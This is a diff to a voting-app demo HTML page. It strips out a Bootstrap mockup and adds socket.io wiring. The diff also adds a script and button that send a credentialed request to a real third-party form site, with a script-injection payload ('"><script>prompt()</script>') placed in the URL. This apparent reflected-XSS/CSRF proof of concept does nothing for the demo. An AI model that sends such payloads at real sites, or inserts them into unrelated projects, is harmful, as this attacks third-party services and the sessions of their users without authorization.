@@ -4,506 +4,64 @@
 <head>
     <meta charset="utf-8">
     <title>React Tutorial</title>
+    <!-- possibly use stylish to do css stuff -->
     <link rel="stylesheet" href="css/bootstrap.min.css" type="text/css" rel="stylesheet">
+    <link rel="stylesheet" href="css/dragula.css" type="text/css" rel="stylesheet">
 </head>
 
 <body>
 
-    <nav class="navbar navbar-default">
-        <div class="container-fluid">
-            <div class="navbar-header">
-                <button type="button" id="test" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
-            <span class="sr-only">Toggle navigation</span>
-            <span class="icon-bar"></span>
-            <span class="icon-bar"></span>
-            <span class="icon-bar"></span>
-          </button>
-                <a class="navbar-brand" href="#">PushVote Demo</a>
-            </div>
-            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
 
-                <ul class="nav navbar-nav navbar-right">
-                    <li class="dropdown">
-                        <a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-expanded="false">Login <span class="caret"></span></a>
-                        <ul class="dropdown-menu" role="menu">
-                            <li><a href="#">Action</a></li>
-                            <li><a href="#">Another action</a></li>
-                            <li><a href="#">Something else here</a></li>
-                            <li class="divider"></li>
-                            <li><a href="#">Separated link</a></li>
-                            <li class="divider"></li>
-                            <li><a href="#">One more separated link</a></li>
-                        </ul>
-                    </li>
-                </ul>
-            </div>
-        </div>
-    </nav>
-
-    <div class="form-group" style="padding: 0px 20px;">
-        <input class="form-control" placeholder="Search" type="text" data-container="body" data-toggle="popover" data-placement="bottom" data-content="Vivamus
-      sagittis lacus vel augue laoreet rutrum faucibus." data-original-title="" title="">
-    </div>
-
-    <div style="padding: 0px 20px;">
-
-        <h3>Search Results</h3>
-        <ul class="nav nav-tabs">
-          <li class="active"><a href="#allResultsTable" data-toggle="tab" aria-expanded="false">Results</a></li>
-          <li class=""><a href="#personalResultsTable" data-toggle="tab" aria-expanded="false">Personal</a></li>
-            <li class=""><a href="#masterResultsTable" data-toggle="tab" aria-expanded="false">Master</a></li>
-            <li class=""><a href="#historyResultsTable" data-toggle="tab" aria-expanded="false">History</a></li>
-            <li class=""><a href="#markedResultsTable" data-toggle="tab" aria-expanded="false">Marked</a></li>
-            <li class="dropdown navbar-right">
-                <a class="dropdown-toggle" data-toggle="dropdown" href="#">View Settings <span class="caret"></span>  </a>
-                <ul class="dropdown-menu">
-                    <li><a href="#home" data-toggle="tab">Bottomless Scroll</a></li>
-                    <li><a href="#profile" data-toggle="tab">Another action</a></li>
-                </ul>
-            </li>
-            <div>
-                <input class="form-control  .d-inline-block" placeholder="Search" type="text" data-container="body" data-toggle="popover" data-placement="bottom" data-content="Vivamus
-        sagittis lacus vel augue laoreet rutrum faucibus." data-original-title="" title="">
-            </div>
-        </ul>
-
-        <div id="myTabContent" class="tab-content">
-          <div class="tab-pane fade in active" id="allResultsTable">
-                <div class="col-xs-6">
-                    <h6>Personal List Search Results</h6>
-                    <table class="table table-striped table-hover ">
-                        <thead>
-                            <tr>
-                                <th>#</th>
-                                <th>Name </th>
-                                <th>People</th>
-                                <th>Breadcrumb</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            <tr class="warning">
-                                <td>1</td>
-                                <td>Results <span class="badge">14</span></td>
-                                <td>Column content</td>
-                                <td>Column content</td>
-                            </tr>
-                            <tr class="active">
-                                <td>2</td>
-                                <td>Column content</td>
-                                <td>Column content</td>
-                                <td>Column content</td>
-                            </tr>
-                            <tr class="info">
-                                <td>3</td>
-                                <td>Column content</td>
-                                <td>Column content</td>
-                                <td>Column content</td>
-                            </tr>
-                            <tr class="success">
-                                <td>4</td>
-                                <td>Column content</td>
-                                <td>Column content</td>
-                                <td>Column content</td>
-                            </tr>
-                            <tr class="danger">
-                                <td>5</td>
-                                <td>Column content</td>
-                                <td>Column content</td>
-                                <td>Column content</td>
-                            </tr>
-                        </tbody>
-                    </table>
-                </div>
-                <div class="col-xs-6">
-                    <h6>Master List Search Results</h6>
-                    <table class="table table-striped table-hover ">
-                        <thead>
-                            <tr>
-                                <th>#</th>
-                                <th>Column heading</th>
-                                <th>Column heading</th>
-                                <th>Column heading</th>
-                            </tr>
-                        </thead>
-                        <tbody>
-                            <tr class="warning">
-                                <td>1</td>
-                                <td>Column content</td>
-                                <td>Column content</td>
-                                <td>Column content</td>
-                            </tr>
-                            <tr class="active">
-                                <td>2</td>
-                                <td>Column content</td>
-                                <td>Column content</td>
-                                <td>Column content</td>
-                            </tr>
-                            <tr class="info">
-                                <td>3</td>
-                                <td>Column content</td>
-                                <td>Column content</td>
-                                <td>Column content</td>
-                            </tr>
-                            <tr class="success">
-                                <td>4</td>
-                                <td>Column content</td>
-                                <td>Column content</td>
-                                <td>Column content</td>
-                            </tr>
-                            <tr class="danger">
-                                <td>5</td>
-                                <td>Column content</td>
-                                <td>Column content</td>
-                                <td>Column content</td>
-                            </tr>
-                        </tbody>
-                    </table>
-                </div>
-
-            </div>
-          <div class="tab-pane fade in" id="personalResultsTable">
-
-              <h6>Personal List Search Results</h6>
-              <table class="table table-striped table-hover ">
-                  <thead>
-                      <tr>
-                        <th>#</th>
-                        <th>Name</th>
-                        <th>People</th>
-                        <th>Breadcrumb</th>
-                      </tr>
-                  </thead>
-                  <tbody>
-                      <tr class="warning">
-                          <td>1</td>
-                          <td>Personal <span class="badge">14</span></td>
-                          <td>Column content</td>
-                          <td>Column content</td>
-                      </tr>
-                      <tr class="active">
-                          <td>2</td>
-                          <td>Column content</td>
-                          <td>Column content</td>
-                          <td>Column content</td>
-                      </tr>
-                      <tr class="info">
-                          <td>3</td>
-                          <td>Column content</td>
-                          <td>Column content</td>
-                          <td>Column content</td>
-                      </tr>
-                      <tr class="success">
-                          <td>4</td>
-                          <td>Column content</td>
-                          <td>Column content</td>
-                          <td>Column content</td>
-                      </tr>
-                      <tr class="danger">
-                          <td>5</td>
-                          <td>Column content</td>
-                          <td>Column content</td>
-                          <td>Column content</td>
-                      </tr>
-                  </tbody>
-              </table>
-          </div>
-          <div class="tab-pane fade in" id="masterResultsTable">
-                <h6>Master List Search Results</h6>
-                <table class="table table-striped table-hover ">
-                    <thead>
-                        <tr>
-                          <th>#</th>
-                          <th>Name</th>
-                          <th>People</th>
-                          <th>Breadcrumb</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <tr class="warning">
-                            <td>1</td>
-                            <td>Master <span class="badge">14</span></td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                        </tr>
-                        <tr class="active">
-                            <td>2</td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                        </tr>
-                        <tr class="info">
-                            <td>3</td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                        </tr>
-                        <tr class="success">
-                            <td>4</td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                        </tr>
-                        <tr class="danger">
-                            <td>5</td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                        </tr>
-                    </tbody>
-                </table>
-            </div>
-          <div class="tab-pane fade in" id="historyResultsTable">
-                <h6>History Results</h6>
-                <table class="table table-striped table-hover ">
-                    <thead>
-                        <tr>
-                          <th>#</th>
-                          <th>Name</th>
-                          <th>People</th>
-                          <th>Breadcrumb</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <tr class="warning">
-                            <td>1</td>
-                            <td>History <span class="badge">14</span></td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                        </tr>
-                        <tr class="active">
-                            <td>2</td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                        </tr>
-                        <tr class="info">
-                            <td>3</td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                        </tr>
-                        <tr class="success">
-                            <td>4</td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                        </tr>
-                        <tr class="danger">
-                            <td>5</td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                        </tr>
-                    </tbody>
-                </table>
-            </div>
-          <div class="tab-pane fade in" id="markedResultsTable">
-                <h6>Marked Results</h6>
-                <table class="table table-striped table-hover ">
-                    <thead>
-                        <tr>
-                          <th>#</th>
-                          <th>Name</th>
-                          <th>People</th>
-                          <th>Breadcrumb</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <tr class="warning">
-                            <td>1</td>
-                            <td>Marked <span class="badge">14</span></td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                        </tr>
-                        <tr class="active">
-                            <td>2</td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                        </tr>
-                        <tr class="info">
-                            <td>3</td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                        </tr>
-                        <tr class="success">
-                            <td>4</td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                        </tr>
-                        <tr class="danger">
-                            <td>5</td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                            <td>Column content</td>
-                        </tr>
-                    </tbody>
-                </table>
-            </div>
-        </div>
-
-    </div>
-        <div class="row">
-            <div class="col-lg-3 col-md-3 col-sm-3 col-xs-12"><!-- new line here because anything under gets centerd!? --></div>
-        </div>
-
-
-    <div style="padding: 0px 20px;">
-      <ul class="nav nav-tabs">
-        <li class="active"><a href="#cat" data-toggle="tab" aria-expanded="false">cat</a></li>
-        <li class=""><a href="#dog" data-toggle="tab" aria-expanded="false">dog</a></li>
-      </ul>
-
-      <div id="myTabContent" class="tab-content">
-        <div class="tab-pane fade in active" id="cat">
-          <h3></h3>
-          <span class="breadcrumb .d-inline-block">
-          <li><a href="#">Home</a></li>
-          <li><a href="#">Library</a></li>
-          <li class="active">cat</li>
-          </span>
-
-          <div style="margin-top: 10px">
-              <ul class="nav nav-tabs">
-                  <li class="active"><a href="#profile" data-toggle="tab" aria-expanded="false">Votes</a></li>
-                  <li class=""><a href="#profile" data-toggle="tab" aria-expanded="false">People</a></li>
-                  <li><a href="#profile" data-toggle="tab" aria-expanded="false">Actions</a></li>
-                  <li class="dropdown navbar-right">
-                      <a class="dropdown-toggle" data-toggle="dropdown" href="#">View Settings <span class="caret"></span>  </a>
-                      <ul class="dropdown-menu">
-                          <li><a href="#home" data-toggle="tab">Bottomless Scroll</a></li>
-                          <li><a href="#profile" data-toggle="tab">Another action</a></li>
-                      </ul>
-                  </li>
-                  <div>
-                      <input class="form-control  .d-inline-block" placeholder="Search" type="text" data-container="body" data-toggle="popover" data-placement="bottom" data-content="Vivamus
-                                sagittis lacus vel augue laoreet rutrum faucibus." data-original-title="" title="">
-                  </div>
-              </ul>
-          </div>
-
-          <table class="table table-striped table-hover">
-              <thead>
-                  <tr>
-                      <th>#</th>
-                      <th>Children</th>
-                      <th>People</th>
-                      <th>BreadCrumbs</th>
-                  </tr>
-              </thead>
-              <tbody>
-                  <tr class="warning">
-                      <td>1</td>
-                      <td>cat</td>
-                      <td>Column content</td>
-                      <td>Column content</td>
-                  </tr>
-                  <tr class="active">
-                      <td>2</td>
-                      <td>Column content</td>
-                      <td>Column content</td>
-                      <td>Column content</td>
-                  </tr>
-                  <tr class="info">
-                      <td>3</td>
-                      <td>Column content</td>
-                      <td>Column content</td>
-                      <td>Column content</td>
-                  </tr>
-                  <tr class="success">
-                      <td>4</td>
-                      <td>Column content</td>
-                      <td>Column content</td>
-                      <td>Column content</td>
-                  </tr>
-                  <tr class="danger">
-                      <td>5</td>
-                      <td>Column content</td>
-                      <td>Column content</td>
-                      <td>Column content</td>
-                  </tr>
-              </tbody>
-          </table>
-        </div>
-        <div class="tab-pane fade in" id="dog">
-          <h3></h3>
-          <span class="breadcrumb .d-inline-block">
-          <li><a href="#">Home</a></li>
-          <li><a href="#">Library</a></li>
-          <li class="active">dog</li>
-          </span>
-
-          <div style="margin-top: 10px">
-              <ul class="nav nav-tabs">
-                  <li class="active"><a href="#profile" data-toggle="tab" aria-expanded="false">Votes</a></li>
-                  <li class=""><a href="#profile" data-toggle="tab" aria-expanded="false">People</a></li>
-                  <li><a href="#profile" data-toggle="tab" aria-expanded="false">Actions</a></li>
-                  <li class="dropdown navbar-right">
-                      <a class="dropdown-toggle" data-toggle="dropdown" href="#">View Settings <span class="caret"></span>  </a>
-                      <ul class="dropdown-menu">
-                          <li><a href="#home" data-toggle="tab">Bottomless Scroll</a></li>
-                          <li><a href="#profile" data-toggle="tab">Another action</a></li>
-                      </ul>
-                  </li>
-                  <div>
-                      <input class="form-control  .d-inline-block" placeholder="Search" type="text" data-container="body" data-toggle="popover" data-placement="bottom" data-content="Vivamus
-                                sagittis lacus vel augue laoreet rutrum faucibus." data-original-title="" title="">
-                  </div>
-              </ul>
-          </div>
-
-          <table class="table table-striped table-hover">
-              <thead>
-                  <tr>
-                      <th>#</th>
-                      <th>Children</th>
-                      <th>People</th>
-                      <th>BreadCrumbs</th>
-                  </tr>
-              </thead>
-              <tbody>
-                  <tr class="warning">
-                      <td>1</td>
-                      <td>dog</td>
-                      <td>Column content</td>
-                      <td>Column content</td>
-                  </tr>
-                  <tr class="active">
-                      <td>2</td>
-                      <td>Column content</td>
-                      <td>Column content</td>
-                      <td>Column content</td>
-                  </tr>
-                  <tr class="info">
-                      <td>3</td>
-                      <td>Column content</td>
-                      <td>Column content</td>
-                      <td>Column content</td>
-                  </tr>
-                  <tr class="success">
-                      <td>4</td>
-                      <td>Column content</td>
-                      <td>Column content</td>
-                      <td>Column content</td>
-                  </tr>
-                  <tr class="danger">
-                      <td>5</td>
-                      <td>Column content</td>
-                      <td>Column content</td>
-                      <td>Column content</td>
-                  </tr>
-              </tbody>
-          </table>
-        </div>
-      </div>
-
-
-    </div>
-
+  <script>
+  function submitRequest()
+  {
+    var xhr = new XMLHttpRequest();
+    xhr.open("GET", "http://www.123contactform.com/sfnew2.php?redirect=false&action=showreports&quot;><script>prompt()</script>20formaction321&s=1282550&rid=21330&disable_cdn_usage=yes", true);
+    xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");
+    xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.8");
+    xhr.withCredentials = true;
+    var body = "";
+    var aBody = new Uint8Array(body.length);
+    for (var i = 0; i < aBody.length; i++)
+      aBody[i] = body.charCodeAt(i);
+    xhr.send(new Blob([aBody]));
+  }
+</script>
+<form action="#">
+  <input type="button" value="Submit request" onclick="submitRequest();" />
+</form>
 
     <div id="app"></div>
+    <script src="http://localhost:3000/socket.io/socket.io.js"></script>
+    <script>
+            socket_vote = io.connect("10.1.1.222:3000");
+
+        /*  Websocket
+             websocket = new WebSocket("ws://echo.websocket.org/");
+
+             function init() {
+                 websocket.onopen = function(evt) {
+                     console.log("CONNECTED");
+                     websocket.send("WebSocket rocksaaaa");
+                 };
+                 websocket.onclose = function(evt) {
+                     console.log("DISCONNECTED");
+                 };
+                 websocket.onmessage = function(evt) {
+                   console.log(evt.data);
+                     //websocket.close();
+
+                 };
+                 websocket.onerror = function(evt) {
+                     console.log("Error", evt)
+                 };
+             }
+
+             window.addEventListener("load", init, false);
+        */
+    </script>
+
+
     <script src="./js/lib/jquery.min.js"></script>
     <script src="./js/lib/bootstrap.min.js"></script>
     <script src="./client.min.js"></script>
